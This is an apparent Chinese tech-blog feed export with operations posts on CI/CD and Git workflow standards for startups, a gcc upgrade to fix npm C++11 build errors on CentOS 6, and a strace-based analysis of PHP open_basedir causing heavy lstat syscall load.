<h3 id="应用管理规范"><a href="#应用管理规范" class="headerlink" title="应用管理规范"></a>应用管理规范</h3><h4 id="应用版本化"><a href="#应用版本化" class="headerlink" title="应用版本化"></a>应用版本化</h4><p>　　　 可以使用SVN,Git对代码进行版本控制，建议使用Git(GitLab)<br>　　　 项目Group命名规范: 按大的原则根据产品域名区分  或者根据前后端业务模块进行分组(小写字母命名,横杠[-]作为连接字符)<br>　　　 比如: MAKA官网<a href="http://www.maka.im对应的Git仓库Group为official" target="_blank" rel="external">http://www.maka.im对应的Git仓库Group为official</a><br>　　　 按照功能模块分组如商城前端对应的Git仓库Group为store<br>项目名命名规范: 小写字母命名,横杠[-]作为连接字符,命名规则[产品名称]-[项目类型]-(自定义名称),如official-store<br><strong>注:</strong> 在创建项目仓库时就要权衡前后端或者大的功能模块的拆分保持低耦合度</p>
<h4 id="合理的分支策略"><a href="#合理的分支策略" class="headerlink" title="合理的分支策略"></a>合理的分支策略</h4><p>常用的Git工作流：</p>
<p><strong>集中式工作流</strong>：很多公司使用SVN,Git使用并不熟悉,如果迁移至Git之后可以考虑集中式工作流进行开发，代码库只有master一个分支,所有开发者只有本地master和远端master分支，集中式工作流使用起来虽然简单，但无法充分利用git的优势<br><strong>功能分支工作流</strong>： 与集中式工作流不同的地方在于除了master分支以外有功能分支(按功能需求创建的功能分支如third-party-login-feature)，日常开发在功能分支,提测集成时提交Merge Requests(在Bitbucket中是Pull Request)，此处开发者可以进行讨论审核代码,同意后可以合并至master分支,未同意或者让开发者修改后重新提交可以选择关闭该MR</p>
<p><img src="http://www.simlinux.com/wp-content/uploads/2016/03/featurebranch.png" alt=""><br><strong>Gitflow工作流</strong>：两个主干分支master(正式发布的历史)和develop(功能集成分支)，开发者应基于develop分支创建feature功能分支用于开发,开发完成后提交merge requests请求合并进develop分支,此时若到了发布窗口,基于此时的develop分支创建发布分支release用于测试,预发布,发布以避免影响develop分支的正常集成合并功能分支；release分支不再有新的功能合并进来，一旦创建只用于bug修复并将修复cherry-pick到develop分支;发布完成后，release分支合并进master并分配版本号打tag用于存放发布历史;Gitflow工作流方式适用于大型项目<br><strong>Forking工作流</strong>：开发者fork官方的repo到自己的账号空间,对于官方分支只有只读权限，开发者通过pr提交给官方审核是否合并进代码库;开发者通过同步上游官方的repo来使用其他人的代码,分支策略可参考上述三种工作流,适合开源项目</p>
<p>　　　 针对创业公司参与同一个项目的开发者并不多,过于复杂的分支策略并不能带来便利;可以参考leancloud的分支模式,根据团队的使用情况进行调整</p>
<p><strong>介绍下我们当前使用的分支策略：</strong><br>　　　 master：主干分支master用于日常开发的基线<br>　　　 userA：   开发者A日常开发所在分支<br>　　　 release-201603091106: master分支集成测试完成后,构建到预发布环境时自动创建release-201603091106用于发布<br>　　　 hotfix-201603091106 基于当前发布之后的release-201603091106分支用于修复bug,在通过提交merge requests方式合并进release-201603091106，并将修复cherry-pick到master分支<br>　　　 日常开发在userA分支操作，然后提交merge requests请求合并至master分支,本地通过git fetch origin master，然后在userA分支git rebase origin/master将master最新commit合并到本地userA分支从而形成闭环开发</p>
<h4 id="关于代码审核"><a href="#关于代码审核" class="headerlink" title="关于代码审核"></a>关于代码审核</h4><p>　　　三剑客GitLab+Jenkins+Gerrit,Gerrit作为创业公司代码审核的话略显复杂，不足够敏捷;建议使用GitLab的Merge Requests或者Github和Bitbucket中Pull Requests作为代码审核和讨论的工具,也可以选择Facebook的Phabricator(可同时作为代码托管和评审,非常敏捷,由于Phabricator提供的工具集在windows下使用起来不太友好,后来没有选用,后期会分享Phabricator的使用思路和工作流)</p>
<h4 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h4><p>　　　规范的目录结构不仅有利于开发者理解代码结构,更有利于代码的快速部署，以PHP为例目录结构建议将代码配置文件(数据库，Redis，OSS Key，语言开关，日志级别开关等),日志文件,其他文件缓存等独立于代码库之外存放，前端项目src为源码目录,dist为前端经过压缩合并等最终生成的代码目录(发布时可忽略src);<br>　　　每个项目详细写README.md:项目说明,各个环境对应的访问路径,目录说明,构建压缩方式,Nginx配置等,代码仓库中包含额外的test目录存放测试用例(本着谁开发谁写测试用例);</p>
<p><img src="http://www.simlinux.com/wp-content/uploads/2016/03/tree.png" alt=""></p>
<h3 id="权限管理规范"><a href="#权限管理规范" class="headerlink" title="权限管理规范"></a>权限管理规范</h3><p>　　　权限有两类一个是系统权限(包括服务器登陆，数据库/Redis等)另外一个是服务运行时的权限;</p>
<h4 id="针对系统权限层面"><a href="#针对系统权限层面" class="headerlink" title="针对系统权限层面"></a>针对系统权限层面</h4><p>　　　统一入口，受限访问IP，禁止空密码弱口令，生产环境服务器需要先拨入vpn之后通过跳板机才能连接成功（当然我们使用的是开源当中最好的跳板机Jumpserver），任何人的操作都需要审计;生产数据库及Redis禁止了外网访问,分别使用phpMyAdmin和RedisLive统一访问入口(增加了多主机访问及屏蔽了危险操作如DDL 数据的导入导出等，也需要先拨入vpn才能访问);</p>
<p>　　　开发测试环境权限控制现对宽松,DEV Leader和QA Leader同时具有开发和测试环境的服务器及数据库权限，便于测试和Debug;生产环境为了便于开发调试生产代码且不影响线上增加了低配的节点，未在线，但环境，代码及后端均和生产一致;</p>
<h4 id="针对服务权限层面"><a href="#针对服务权限层面" class="headerlink" title="针对服务权限层面"></a>针对服务权限层面</h4><p>　　　以web服务为例:Nginx和php-fpm运行用户和用户组为www-data,代码目录用户为www,这样代码目录默认情况下web服务只读,避免出现文件和目录777权限的情况；日志和缓存目录用户设置www-data，但要禁止访问php等动态文件</p>
<p>　　　禁止危险函数phpinfo exec eval system等,具体可参考<a href="http://www.sinacloud.com/doc/sae/php/runtime.html,禁止夸目录访问open_basedir，是否开启的性能对比请参考http://www.simlinux.com/archives/1531.html" target="_blank" rel="external">http://www.sinacloud.com/doc/sae/php/runtime.html,禁止夸目录访问open_basedir，是否开启的性能对比请参考http://www.simlinux.com/archives/1531.html</a></p>
<h3 id="配置变更规范"><a href="#配置变更规范" class="headerlink" title="配置变更规范"></a>配置变更规范</h3><h4 id="系统部署"><a href="#系统部署" class="headerlink" title="系统部署"></a>系统部署</h4><p>　　　传统IDC机房可以通过定制镜像或者使用cobbler定制安装，运行的服务也可以定制在镜像中,但建议安装系统时注册puppet/salt agent，再自动化署相关服务<br>　　　公有云中可以在服务器上部署相应环境后创建系统快照制作系统镜像,弹性扩容时可选择该镜像自动化安装   </p>
<h4 id="日常变更"><a href="#日常变更" class="headerlink" title="日常变更"></a>日常变更</h4><p>　　   日常变更包括服务配置的变更和代码配置的变更,这些操作我们是通过Ansible(对比puppet/salt的好处就是简单方便不用装agent，后面会详细介绍如何基于Ansible做发布回滚)，变更内容使用git进行版本控制制</p>
<p><img src="http://www.simlinux.com/wp-content/uploads/2016/03/ansible-dire.png" alt=""></p>
<h3 id="发布策略规范"><a href="#发布策略规范" class="headerlink" title="发布策略规范"></a>发布策略规范</h3><h4 id="发布时间"><a href="#发布时间" class="headerlink" title="发布时间"></a>发布时间</h4><p><img src="http://www.simlinux.com/wp-content/uploads/2016/03/deploytime.jpg" alt=""></p>
<p><strong>注意:</strong>以上请根据自己业务做相应调整,避免在业务高峰期发布(除应急bug外),我们业务高峰期基本在18:00-23:30，低峰期基本在01:00-06:00,这也是微信分享阅读的高峰和低峰时段;无论应急Bug还是日常迭代都必须由QA测试通过和产品经理审核通过后才能上线(曾经出现过开发为了修复线上很急的bug,开发修复后自主上线导致生产出现更严重的问题)</p>
<h4 id="发布工具的选择"><a href="#发布工具的选择" class="headerlink" title="发布工具的选择"></a>发布工具的选择</h4><p>　　　 无论是自主开发发布系统亦或是使用开源的系统都要本着解决问题的原则,否则只能是重复造轮子,然并卵呀<br>　　　 开源的持续集成和发布里面个人觉得比较好的如:Jenkins,Walle,Spinnaker，go，Gitlab-ci，Bamboo(收费)等，其他参考<a href="https://github.com/geekwolf/sa-scripts/blob/master/devops.md" target="_blank" rel="external">https://github.com/geekwolf/sa-scripts/blob/master/devops.md</a><br>　　　 下面介绍我们基于GitLab+Jenkins+Ansible(Flamingo自动化代码发布工具)实现的自动化代码部署平台，流程如下:</p>
<p><img src="http://www.simlinux.com/wp-content/uploads/2016/03/cicdflow.png" alt=""></p>
<p>　　　<strong>Flamingo</strong>(“火烈鸟”,<a href="https://github.com/geekwolf/flamingo)是基于Ansible的自动化代码发布工具，目的是实现统一的代码发布方式,思路基于Capistrano,并对Ansisrano进行了改造可以通过传入语言环境,主机组(应用组/灰度机组等),项目代码库,分支名称,项目名称等参数来进行自动化打包发布,也可以将Flamingo工具二次打包使用" target="_blank" rel="external">https://github.com/geekwolf/flamingo)是基于Ansible的自动化代码发布工具，目的是实现统一的代码发布方式,思路基于Capistrano,并对Ansisrano进行了改造可以通过传入语言环境,主机组(应用组/灰度机组等),项目代码库,分支名称,项目名称等参数来进行自动化打包发布,也可以将Flamingo工具二次打包使用</a><br>　　　<strong>Flamingo</strong>本者回滚即发布的原则以简化发布流程，回滚时传入要回滚的分支即可，其他参数可参看defaults/main.yml进行了解;(注:依赖Git/rsync/ansible)<br>　　　 例子:</p>
<pre><code>ansible-playbook deploy.yml  --extra-vars=&apos;flamingo_git_repo=git@github.com:geekwolf/flamingo.git flamingo_product_name=flamingo&apos;
</code></pre><p>　　　 执行后生成的目录结构如下图(目录定义请参考defaults/main.yml):</p>
<p><img src="http://www.simlinux.com/wp-content/uploads/2016/03/deploymentdire.jpg" alt=""></p>
<h3 id="日志运维规范"><a href="#日志运维规范" class="headerlink" title="日志运维规范"></a>日志运维规范</h3><p>　　　 毫无疑问规范的日志对于运维和开发排查问题有非常大的帮助，例如PHP项目日志格式可以规范为时间,日志级别,日志内容(比如对于连接多个DB时出现连接不上或超时应该把实例地址一同写入日志)，可以参考psr-3的标准: <a href="http://www.php-config.org/psr/psr-3" target="_blank" rel="external">http://www.php-config.org/psr/psr-3</a><br>　　　 通过ELK将业务日志,PHP自身错误日志/慢日志,Nginx慢日志等进行搜集统计并结合Zabbix实现报警,便于及早发现问题</p>
<h3 id="持续集成部署实战"><a href="#持续集成部署实战" class="headerlink" title="持续集成部署实战"></a>持续集成部署实战</h3><p>　　　 后续篇章会分享针对PHP/JAVA/前端以及Android/ios持续集成和部署实战,敬请关注</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>　　　 以上只是粗略对持续集成和部署过程中遇到的问题进行了总结，可能并不完美，但对于初创公司应该有些帮助,欢迎一起学习讨论！</p>
]]></content>
      
        <categories>
            
            <category> CI/CD </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[node5.1使用npm安装依赖时提示  node/NAN/v8 requires a C++11 compiler]]></title>
      <url>/2016/01/06/node5-1-e4-bd-bf-e7-94-a8npm-e5-ae-89-e8-a3-85-e4-be-9d-e8-b5-96-e6-97-b6-e6-8f-90-e7-a4-ba-nodenanv8-requires-a-c11-compiler.html</url>
      <content type="html"><![CDATA[<p><strong>问题</strong>：Centos6.5 x64环境node5.1使用npm安装依赖时提示 requires a C++11 compiler错误</p>
<p><pre class="lang:php decode:true">[root@ front_end_v3]# cnpm install<br>npm WARN engine jest-cli@0.4.19: wanted: {“node”:”0.8.x || 0.10.x”} (current: {“node”:”5.1.0”,”npm”:”2.13.5”})<br>npm WARN peerDependencies The peer dependency file-loader@* included from url-loader will no<br>npm WARN peerDependencies longer be automatically installed to fulfill the peerDependency<br>npm WARN peerDependencies in npm 3+. Your application will need to depend on it explicitly.<br>npm WARN optional dep failed, continuing fsevents@1.0.6<br>npm WARN optional dep failed, continuing fsevents@1.0.6<br>npm WARN deprecated lodash@1.0.2: lodash@&lt;2.0.0 is no longer maintained. Upgrade to lodash@^3.0.0<br>npm WARN deprecated lodash@2.4.2: lodash@&lt;3.0.0 is no longer maintained. Upgrade to lodash@^3.0.0</pre></p>
<p>&gt; contextify@0.1.15 install /wwwroot/front_end_v3/node_modules/jest-cli/node_modules/jsdom/node_modules/contextify<br>&gt; node-gyp rebuild</p>
<p>make: Entering directory `/wwwroot/front_end_v3/node_modules/jest-cli/node_modules/jsdom/node_modules/contextify/build’<br>  CXX(target) Release/obj.target/contextify/src/contextify.o<br>In file included from ../src/contextify.cc:3:<br>../node_modules/nan/nan.h:41:3: error: #error This version of node/NAN/v8 requires a C++11 compiler<br>In file included from /root/.node-gyp/5.1.0/src/node.h:42,<br>                 from ../src/contextify.cc:1<br><strong>解决方法:</strong></p>
<p>由于node4.0升级了v8引擎,编译时需要gcc4.8以上版本,Centos6自带的gcc为gcc-4.4.7,<span style="color: #333333;">不支持编译所需的C++11标准,所以只好升级gcc(devtoolsset-3 -&gt; gcc-4.9)（直接升级到最新）</span></p>
<p><pre class="lang:php decode:true">rpm -ivh <a href="https://www.softwarecollections.org/en/scls/rhscl/devtoolset-3/epel-6-x86_64/download/rhscl-devtoolset-3-epel-6-x86_64.noarch.rpm" target="_blank" rel="external">https://www.softwarecollections.org/en/scls/rhscl/devtoolset-3/epel-6-x86_64/download/rhscl-devtoolset-3-epel-6-x86_64.noarch.rpm</a><br>yum install devtoolset-3-gcc-c++<br>临时使用最新版gcc：<br>scl enable devtoolset-3 bash<br>系统默认使用gcc-4.9<br>echo “source /opt/rh/devtoolset-3/enable” &gt;&gt;/etc/profile</pre><br>&nbsp;</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[ 记一次Web服务器lstat系统调用严重故障分析]]></title>
      <url>/2015/12/14/e8-ae-b0-e4-b8-80-e6-ac-a1web-e6-9c-8d-e5-8a-a1-e5-99-a8lstat-e7-b3-bb-e7-bb-9f-e8-b0-83-e7-94-a8-e4-b8-a5-e9-87-8d-e6-95-85-e9-9a-9c-e5-88-86-e6-9e-90.html</url>
      <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;先看下系统环境<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Centos6.5 x64<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Tengine-2.1.0<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PHP-5.5.30<br>&nbsp;&nbsp;&nbsp;&nbsp;随着业务流量增加,根据监控发现系统%sys的CPU占用率一度超过40%~50%(业务高峰期更为严重),<br>由于系统跑的是PHP,Nginx服务没有其它额外服务,PHP又容易成为系统的瓶颈，故使用strace跟踪了php-fpm进程的调用,如图:</p>
<h3 id="看现象"><a href="#看现象" class="headerlink" title="看现象"></a>看现象</h3><p>通过top命令查看实时状态,%sys内核态CPU占比非常高,负载较高</p>
<p><img src="http://www.simlinux.com/wp-content/uploads/2015/12/te.jpg" alt=""></p>
<p>通过strace跟踪php-fpm进程运行时的系统调用 strace -c -p $(pgrep -n php-fpm)<img src="http://www.simlinux.com/wp-content/uploads/2015/12/lstat.jpg" alt=""></p>
<p>lstat调用到底干什么的呢？<a href="http://www.simlinux.com/wp-content/uploads/2015/12/manlstat.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2015/12/manlstat.jpg" alt="manlstat"></a><br><a href="http://www.simlinux.com/wp-content/uploads/2015/12/manlstat.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2015/12/manlstat-1024x400.jpg" alt="manlstat"></a><a href="http://www.simlinux.com/wp-content/uploads/2015/12/te.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2015/12/te.jpg" alt="te"></a></p>
<h3 id="分析问题"><a href="#分析问题" class="headerlink" title="分析问题"></a>分析问题</h3><p>根据上面的现象可以看到lstat调用占用绝大部份的内核态CPU时间，可以通过strace跟踪php-fpm详细的lstat调用规律<br>strace  -o strace.out -r -s 256 $(pgrep -n php-fpm)</p>
<p><pre class="lang:php decode:true">     0.000051 getcwd(“/data/wwwroot/run/platv3/public”, 4096) = 43<br>     0.000037 lstat(“/data/wwwroot/run/platv3/public/../application/config/production/frontend_config.php”, 0x7fffbe160260) = -1 ENOENT (No such file or directory)<br>     0.000055 lstat(“/data/wwwroot/run/platv3/public/../application/config/production”, {st_mode=S_IFDIR|0775, st_size=4096, …}) = 0<br>     0.000058 lstat(“/data/wwwroot/run/platv3/public/../application/config”, {st_mode=S_IFDIR|0775, st_size=4096, …}) = 0<br>     0.000054 lstat(“/data/wwwroot/run/platv3/public/../application”, {st_mode=S_IFDIR|0775, st_size=4096, …}) = 0<br>     0.000052 lstat(“/data/wwwroot/run/platv3/public”, {st_mode=S_IFDIR|0775, st_size=4096, …}) = 0<br>     0.000050 lstat(“/data/wwwroot/run/platv3”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000058 lstat(“/data/wwwroot/run”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000046 lstat(“/data/wwwroot”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000043 lstat(“/data”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000045 lstat(“/data/wwwroot/run/platv3/application/config/production/frontend_config.php”, 0x7fffbe160270) = -1 ENOENT (No such file or directory)<br>     0.000050 readlink(“/data/wwwroot/run/platv3/application/config/production/frontend_config.php”, 0x7fffbe162410, 4095) = -1 ENOENT (No such file or directory)<br>     0.000077 lstat(“/data/wwwroot/run/platv3/application/config/production”, {st_mode=S_IFDIR|0775, st_size=4096, …}) = 0<br>     0.000059 lstat(“/data/wwwroot/run/platv3/application/config”, {st_mode=S_IFDIR|0775, st_size=4096, …}) = 0<br>     0.000052 lstat(“/data/wwwroot/run/platv3/application”, {st_mode=S_IFDIR|0775, st_size=4096, …}) = 0<br>     0.000050 lstat(“/data/wwwroot/run/platv3”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000047 lstat(“/data/wwwroot/run”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000070 lstat(“/data/wwwroot”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000046 lstat(“/data”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000046 lstat(“/data/wwwroot/run”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000047 lstat(“/data/wwwroot”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000044 lstat(“/data”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000045 access(“../application/config/production/frontend_config.php”, F_OK) = -1 ENOENT (No such file or directory)<br>     0.000051 getcwd(“/data/wwwroot/run/platv3/public”, 4096) = 43<br>     0.000038 getcwd(“/data/wwwroot/run/platv3/public”, 4096) = 43<br>     0.000036 lstat(“/data/wwwroot/run/platv3/public/../application/config/frontend_config.php”, {st_mode=S_IFREG|0775, st_size=1556, …}) = 0<br>     0.000069 lstat(“/data/wwwroot/run/platv3/public/../application/config”, {st_mode=S_IFDIR|0775, st_size=4096, …}) = 0<br>     0.000057 lstat(“/data/wwwroot/run/platv3/public/../application”, {st_mode=S_IFDIR|0775, st_size=4096, …}) = 0<br>     0.000053 lstat(“/data/wwwroot/run/platv3/public”, {st_mode=S_IFDIR|0775, st_size=4096, …}) = 0<br>     0.000052 lstat(“/data/wwwroot/run/platv3”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000049 lstat(“/data/wwwroot/run”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000075 lstat(“/data/wwwroot”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000045 lstat(“/data”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000046 lstat(“/data/wwwroot/run/platv3/application/config/frontend_config.php”, {stG|0775, st_size=9882, …}) = 0<br>     0.000056 lstat(“/data/wwwroot/run/platv3/application/libraries”, {st_mode=S_IFDIR|0775, st_size=4096, …}) = 0<br>     0.000052 lstat(“/data/wwwroot/run/platv3/application”, {st_mode=S_IFDIR|0775, st_size=4096, …}) = 0<br>     0.000049 lstat(“/data/wwwroot/run/platv3”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000048 lstat(“/data/wwwroot/run”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000045 lstat(“/data/wwwroot”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000043 lstat(“/data”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000046 lstat(“/data/wwwroot/run”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000046 lstat(“/data/wwwroot”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000043 lstat(“/data”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000111 access(“../application/libraries/X_Session.php”, F_OK) = 0<br>     0.000071 getcwd(“/data/wwwroot/run/platv3/public”, 4096) = 43<br>     0.000043 lstat(“/data/wwwroot/run/platv3/system/libraries/Session.php”, {st_mode=S_IFREG|0775, st_size=19266, …}) = 0<br>     0.000060 lstat(“/data/wwwroot/run/platv3/system/libraries”, {st_mode=S_IFDIR|0775, st_size=4096, …}) = 0<br>     0.000051 lstat(“/data/wwwroot/run/platv3/system”, {st_mode=S_IFDIR|0775, st_size=4096, …}) = 0<br>     0.000050 lstat(“/data/wwwroot/run/platv3”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000049 lstat(“/data/wwwroot/run”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000055 lstat(“/data/wwwroot”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000045 lstat(“/data”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000045 lstat(“/data/wwwroot/run/platv3/system/libraries/Session.php”, {st_mode=S_IFREG|0775, st_size=19266, …}) = 0<br>     0.000055 lstat(“/data/wwwroot/run/platv3/system/libraries”, {st_mode=S_IFDIR|0775, st_size=4096, …}) = 0<br>     0.000053 lstat(“/data/wwwroot/run/platv3/system”, {st_mode=S_IFDIR|0775, st_size=4096, …}) = 0<br>     0.000052 lstat(“/data/wwwroot/run/platv3”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000053 lstat(“/data/wwwroot/run”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000047 lstat(“/data/wwwroot”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000051 lstat(“/data”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000047 lstat(“/data/wwwroot/run/platv3/public”, {st_mode=S_IFDIR|0775, st_size=4096, …}) = 0<br>     0.000058 lstat(“/data/wwwroot/run/platv3”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000114 lstat(“/data/wwwroot/run”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000048 lstat(“/data/wwwroot”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000043 lstat(“/data”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000046 lstat(“/data/wwwroot/run/platv3/system/libraries/Session.php”, {st_mode=S_IFREG|0775, st_size=19266, …}) = 0<br>     0.000055 lstat(“/data/wwwroot/run/platv3/system/libraries”, {st_mode=S_IFDIR|0775, st_size=4096, …}) = 0<br>     0.000052 lstat(“/data/wwwroot/run/platv3/system”, {st_mode=S_IFDIR|0775, st_size=4096, …}) = 0<br>     0.000050 lstat(“/data/wwwroot/run/platv3”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000061 lstat(“/data/wwwroot/run”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000051 lstat(“/data/wwwroot”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000044 lstat(“/data”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000045 lstat(“/data/wwwroot/run/platv3/system/libraries/Session.php”, {st_mode=S_IFREG|0775, st_size=19266, …}) = 0<br>     0.000055 lstat(“/data/wwwroot/run/platv3/system/libraries”, {st_mode=S_IFDIR|0775, st_size=4096, …}) = 0<br>     0.000053 lstat(“/data/wwwroot/run/platv3/system”, {st_mode=S_IFDIR|0775, st_size=4096, …}) = 0<br>     0.000049 lstat(“/data/wwwroot/run/platv3”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000050 lstat(“/data/wwwroot/run”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000046 lstat(“/data/wwwroot”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000045 lstat(“/data”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000045 lstat(“/data/wwwroot/run”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000120 lstat(“/data/wwwroot”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>     0.000055 lstat(“/data”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0</pre><br>&nbsp;&nbsp;&nbsp;&nbsp;由上面的信息不难看到程序在使用include,require,require_once,include_once,fopen,gzopen等开启了open_basedir之后,lstat调用会递归访问的文件目录查看文件位置限制，文件在open_basedir指定的目录以外时将拒绝打开,所有符号链接也会被解析无法避免此限制 ,这样就导致了lstat()调用比不开启open_basedir调用频率高很多;另外include,require,require_once,include_once在包含相对路径时,如果代码中存在大量的这样的语句,每次都从include_path中查找相应的文件,也会造成性能问题,所以通常用 realpath_cache_size 和realpath_cache_ttl来对文件的realpath进行缓存,但是开启了open_basedir之后,这个缓存是失效的;查看了官方的bug：<a href="https://bugs.php.net/bug.php?id=52312" target="_blank" rel="external">https://bugs.php.net/bug.php?id=52312</a> 有记录并没有修复,估计是考虑到安全问题</p>
<h3 id="验证问题"><a href="#验证问题" class="headerlink" title="验证问题"></a>验证问题</h3><p>大概了解了问题原因之后,对症下药来做测试,按三种情况测试下性能：<br>1.开启open_basedir</p>
<p><pre class="lang:php decode:true">; Disable PHP’s open_basedir directive so that the realpath cache won’t be<br>; disabled.<br>; Remember, turbo_realpath will set this option later to the<br>; realpath_cache_basedir value.<br>open_basedir = “/data/wwwroot/run/:/tmp/“</pre><br>2.使用realpath_turbo进行优化,开启open_basedir时,依然可以使用<span style="color: #333333;">realpath cache;</span><br>安装realpath_turbo扩展<a href="https://github.com/Whissi/realpath_turbo,修改php.ini" target="_blank" rel="external">https://github.com/Whissi/realpath_turbo,修改php.ini</a></p>
<p><pre class="lang:php decode:true">; you have to load the extension first<br>extension=turbo_realpath.so</pre></p>
<p>; realpath_turbo security mode<br>; Possible values:<br>;   0 - Ignore potential security issues<br>;   1 - Disable dangerous PHP functions (link,symlink)<br>realpath_cache_security = 1</p>
<p>; Set realpath_cache_basedir to whatever you want to set open_basedir to<br>realpath_cache_basedir = “/data/wwwroot/run/:/tmp/“</p>
<p>; Disable PHP’s open_basedir directive so that the realpath cache won’t be<br>; disabled.<br>; Remember, turbo_realpath will set this option later to the<br>; realpath_cache_basedir value.<br>open_basedir = “”</p>
<p>realpath_cache_size = 20m<br>; Duration of time, in seconds for which to cache realpath information for a given<br>; file or directory. For systems with rarely changing files, consider increasing this<br>; value.<br>; <a href="http://php.net/realpath-cache-ttl" target="_blank" rel="external">http://php.net/realpath-cache-ttl</a><br>realpath_cache_ttl = 43200<br><strong>注意事项</strong>：使用realpath_turbo时,要关闭创建和操作符号链接的函数，否则会绕过 open_basedir安全限制,但依然不推荐在多虚拟主机环境使用<br>3.关闭open_basedir,增加realpath缓存</p>
<p><pre class="lang:php decode:true">realpath_cache_size = 20m<br>; Duration of time, in seconds for which to cache realpath information for a given<br>; file or directory. For systems with rarely changing files, consider increasing this<br>; value.<br>; <a href="http://php.net/realpath-cache-ttl" target="_blank" rel="external">http://php.net/realpath-cache-ttl</a><br>realpath_cache_ttl = 43200</pre><br>写脚本分别采集三种环境下系统调用占CPU时间百分比(采集半小时)</p>
<p><pre class="lang:python decode:true">#<em>_</em> coding:utf-8 <em>_</em><br>import time<br>import psutil<br>import os<br>end=1<br>f = open(‘openbasedir.log’,mode=’w’)<br>f.write(“%s\t\t%s\t\t\t%s\t\t%s\t\t%s” % (‘id’,’time’,’sys_percent’,’hi’,’si’) + “\n”)<br>while end &lt;= 1800:<br>    nowtime=time.strftime(“%Y-%m-%d %H:%M:%S”,time.localtime(time.time()))<br>    ps = psutil.cpu_times_percent(interval=1)<br>    data=”%s\t\t%s\t\t%s\t\t%s\t\t%s” % (end,nowtime,ps.system,ps.irq,ps.softirq)<br>    f.write(data+os.linesep)<br>    end +=1</pre><br>最终性能对比结果如图(横轴为采样id(s),纵轴为%sys占CPU时间比):</p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2015/12/tongji.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2015/12/tongji.jpg" alt="tongji"></a></p>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>&nbsp;&nbsp;为了性能暂时关闭了open_basedir参数,开启realpath cache缓存,代码尽量少用include,require,include_once,require_once等</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[使用PhantomJS网页截图字体显示问题]]></title>
      <url>/2015/08/18/e4-bd-bf-e7-94-a8phantomjs-e7-bd-91-e9-a1-b5-e6-88-aa-e5-9b-be-e5-ad-97-e4-bd-93-e6-98-be-e7-a4-ba-e9-97-ae-e9-a2-98.html</url>
